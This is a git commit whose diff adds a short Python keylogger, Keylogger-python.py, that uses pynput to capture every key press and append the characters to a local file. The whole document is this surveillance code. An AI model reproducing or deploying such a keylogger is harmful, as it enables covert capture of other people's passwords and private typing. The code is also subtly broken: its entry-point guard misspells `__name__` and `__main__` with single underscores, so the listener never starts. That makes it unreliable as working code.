573b336ee5f0718becd417fb866894818ddeb2c5
NANDIGAMA PRASHANTH KUMAR <96291949+nandigamaprashanthkumar@users.noreply.github.com>
2024-04-01 12:43:45 +0530

    Update Keylogger-python.py

--- Keylogger/Keylogger-python.py
+++ Keylogger/Keylogger-python.py
@@ -1,1 +1,15 @@
+from pynput import keyboard
 
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logkey:
+        try:
+            char = key.char
+            logkey.write(char)
+        except:
+            print("error getting char")
+
+if _name_ == "_main_":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
